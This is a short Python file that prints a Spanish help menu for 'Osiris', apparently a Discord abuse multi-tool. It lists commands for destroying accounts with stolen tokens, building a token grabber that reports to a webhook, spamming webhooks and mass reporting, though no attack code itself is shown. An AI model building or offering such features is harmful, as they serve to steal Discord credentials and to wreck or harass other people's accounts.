from pystyle import Colors, Colorate, System, Cursor
def ayuda():

    System.Clear()
    System.Title("Comandos :: Osiris")
    Cursor.HideCursor()

    print(Colorate.Vertical(Colors.purple_to_red, f"""
    \n TokenRaper :: Destruye una cuenta por completo.
    \n WebhookSpammer :: Spamea un webhook especificado.
    \n TokenChecker :: Saca la información de una cuenta & verifica si el token es válido.
    \n WebhookChecker :: Revisa la información de un webhook & verifica si el webhook es válido.
    \n HistoryClear :: Elimina tu historial de mensajes en un canal especificado.
    \n AutoBump :: Envia el comando /d bump cada 2 horas en un canal especificado.
    \n TokenGrabber :: Crea un token grabber con la webhook especificado.
    \n ServerLookup :: Revisa la información de un servidor en el que esta el usuario.
    \n MassReport :: Realiza un reporte masivo."""))


def show_help():
    pass
